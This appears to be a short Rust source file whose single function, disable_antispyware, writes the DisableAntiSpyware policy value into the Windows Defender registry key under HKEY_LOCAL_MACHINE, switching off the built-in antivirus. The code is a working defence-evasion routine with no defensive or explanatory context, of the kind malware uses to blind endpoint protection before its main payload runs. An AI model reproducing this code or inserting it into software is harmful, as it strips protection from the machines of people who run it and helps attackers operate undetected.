use winreg::enums::*;
use winreg::RegKey;
pub fn disable_antispyware() {
    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
    //let path = Path::new("SOFTWARE")
    //    .join("Policies")
    //    .join("Microsoft")
    //    .join("Windows Defender");
    let path = "SOFTWARE\\Policies\\Microsoft\\Windows Defender";

    // Create the path if it doesn't exist
    let (key, _) = hkcu.create_subkey(&path).unwrap();

    // Set the DisableAntiSpyware value to 1
    key.set_value("DisableAntiSpyware", &1u32).unwrap();
}
